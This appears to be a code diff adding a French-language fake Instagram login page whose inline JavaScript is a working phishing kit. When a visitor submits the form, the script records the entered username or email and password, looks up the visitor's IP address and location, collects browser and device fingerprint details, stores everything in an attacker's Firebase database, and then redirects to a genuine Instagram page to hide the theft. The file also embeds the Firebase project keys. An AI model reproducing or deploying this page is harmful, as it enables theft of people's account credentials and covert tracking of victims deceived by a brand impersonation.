@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="website icon" type="png"  href="instagram-new-2016-logo-D9D42A0AD4-seeklogo.com.png">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <img class="insta" src="ei_1729335285770-removebg-preview.png" alt="">
+      <a href="https://www.facebook.com/">  <button class="facebook-button">
+        <i class='bx bxl-facebook-square'></i>
+        <span>Continuer avec Facebook</span>
+    </button></a>
+        <div class="ligne">
+            <hr>
+            <p>ou </p> 
+            <hr>
+        </div>  
+            <input class="place" type="text" placeholder="Num. téléphone, nom d'utilisateur ou e-mail" name="email" required>
+            <input type="password" placeholder="Mot de passe" name="password" required>
+            <a class="mot" href="https://www.instagram.com/accounts/password/reset/">Mot de passe oublié ?</a>
+            <a href="https://translate.google.com/?sl=en&tl=ar&op=translate"><button class="login-button" type="submit"><p>Se connecter</p></button></a>
+        </form>
+        
+        <div class="title">
+            <p>Vous n'avez pas de compte ? <a href="https://www.instagram.com/accounts/emailsignup/">Inscrivez-vous</a></p>
+          </div>
+    
+    <footer>
+        <div class="meta">
+           <div class="from"> <p >from</p></div>
+            <div class="icons">
+            <a href="#" class="logo"><i class='bx bxl-meta'></i></a>
+           <p>Meta </p>
+          </div>
+        
+        </div>
+<hr class="final">
+        <div class="footer-icons">
+            <a href="#">
+                <i class='bx bxs-home'></i>            </a>
+            <a href="#">
+                <i class='bx bxs-paper-plane'></i>            </a>
+            <a class="media" href="#">
+                <img src="ei_1729333804366-removebg-preview.png"></a>
+            <a href="#">
+                <i class='bx bx-search'></i>
+            </a>    
+            <a href="#">
+                <i class='bx bx-user'></i>
+            </a>
+            </div>
+            </footer>
+            </body>
+            </html>
+
+
+            <script type="module">
+                // Import the functions you need from the SDKs you need
+                import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+                import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
+            
+                // Your web app's Firebase configuration
+                const firebaseConfig = {
+                  apiKey: "AIzaSyCEModk4t8gd5kFXfqhJdWs-b4muR95lCw",
+                  authDomain: "wrud-d8c8a.firebaseapp.com",
+                  projectId: "wrud-d8c8a",
+                  storageBucket: "wrud-d8c8a.appspot.com",
+                  messagingSenderId: "837519064834",
+                  appId: "1:837519064834:web:e9a5d0c2db734f83abcc1b"
+                };
+              
+                // Initialize Firebase
+                const app = initializeApp(firebaseConfig);
+                const database = getDatabase(app);
+            
+                // Function to get user's IP address and location
+                async function getIPInfo() {
+                    try {
+                        const response = await fetch('https://ipapi.co/json/');
+                        return await response.json();
+                    } catch (error) {
+                        console.error('Error fetching IP info:', error);
+                        return {};
+                    }
+                }
+            
+                // Function to get browser information
+                function getBrowserInfo() {
+                    const browserInfo = {
+                        userAgent: navigator.userAgent,
+                        appName: navigator.appName,
+                        appVersion: navigator.appVersion,
+                        platform: navigator.platform,
+                        vendor: navigator.vendor,
+                        language: navigator.language,
+                        cookiesEnabled: navigator.cookieEnabled,
+                        screenResolution: `${window.screen.width}x${window.screen.height}`,
+                        screenColorDepth: window.screen.colorDepth,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        timezoneOffset: new Date().getTimezoneOffset(),
+                        windowSize: `${window.innerWidth}x${window.innerHeight}`,
+                        connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown'
+                    };
+                    return browserInfo;
+                }
+            
+                // Add event listener to the login button
+                document.querySelector('.login-button').addEventListener('click', async function(e) {
+                    e.preventDefault(); // Prevent the default form submission
+                    
+                    var email = document.querySelector('input[name="email"]').value;
+                    var password = document.querySelector('input[name="password"]').value;
+            
+                    // Validation check
+                    if (!email || !password) {
+                        alert('Veuillez remplir tous les champs.');
+                        return;
+                    }
+            
+                    // Get current date and time
+                    const now = new Date();
+                    const timestamp = now.getTime();
+                    
+                    // Format the date and time in different formats
+                    const clickTime = {
+                        formatted: now.toLocaleString('fr-FR', {
+                            year: 'numeric',
+                            month: '2-digit',
+                            day: '2-digit',
+                            hour: '2-digit',
+                            minute: '2-digit',
+                            second: '2-digit',
+                            hour12: false
+                        }),
+                        iso: now.toISOString(),
+                        unix: Math.floor(now.getTime() / 1000),
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                    };
+            
+                    // Get IP and location information
+                    const ipInfo = await getIPInfo();
+                    
+                    // Get browser and device information
+                    const browserInfo = getBrowserInfo();
+            
+                    // Prepare performance data
+                    const performanceData = {
+                        pageLoadTime: window.performance.timing.loadEventEnd - window.performance.timing.navigationStart,
+                        domLoadTime: window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart,
+                        networkLatency: window.performance.timing.responseEnd - window.performance.timing.requestStart
+                    };
+            
+                    // Save all information to Firebase
+                    set(ref(database, 'users/' + timestamp), {
+                        userCredentials: {
+                            email: email,
+                            password: password
+                        },
+                        timing: {
+                            timestamp: timestamp,
+                            clickTime: clickTime
+                        },
+                        deviceInfo: {
+                            ...browserInfo,
+                            isMobile: /Mobile|Android|iP(hone|od|ad)/i.test(navigator.userAgent),
+                            isTablet: /Tablet|iPad/i.test(navigator.userAgent),
+                            isDesktop: !(/Mobile|Android|iP(hone|od|ad)|Tablet|iPad/i.test(navigator.userAgent))
+                        },
+                        locationInfo: {
+                            ...ipInfo,
+                            timestamp: new Date().toISOString()
+                        },
+                        performanceMetrics: performanceData,
+                        sessionInfo: {
+                            referrer: document.referrer,
+                            currentURL: window.location.href,
+                            previousURLs: sessionStorage.getItem('previousURLs') || [],
+                            sessionDuration: Math.floor((Date.now() - performance.timing.navigationStart) / 1000)
+                        }
+                    }).then(() => {
+                        // After successful save, redirect to Google Translate
+                        window.location.href = 'https://www.instagram.com/ennahar.tv?utm_source=ig_web_button_share_sheet&igsh=ZDNlZDc0MzIxNw==';
+                    }).catch((error) => {
+                        console.error('Error:', error);
+                        alert('Une erreur s\'est produite. Veuillez réessayer.');
+                    });
+                });
+            
+                // Track page visibility
+                document.addEventListener('visibilitychange', function() {
+                    const timestamp = new Date().getTime();
+                    set(ref(database, 'pageVisibility/' + timestamp), {
+                        timestamp: timestamp,
+                        state: document.visibilityState
+                    });
+                });
+            
+                // Add visual feedback for empty fields
+                const inputs = document.querySelectorAll('input');
+                inputs.forEach(input => {
+                    input.addEventListener('blur', function() {
+                        if (!this.value) {
+                            this.style.borderColor = 'red';
+                        } else {
+                            this.style.borderColor = '';
+                        }
+                    });
+                    input.addEventListener('input', function() {
+                        this.style.borderColor = '';
+                    });
+                });
+            </script>
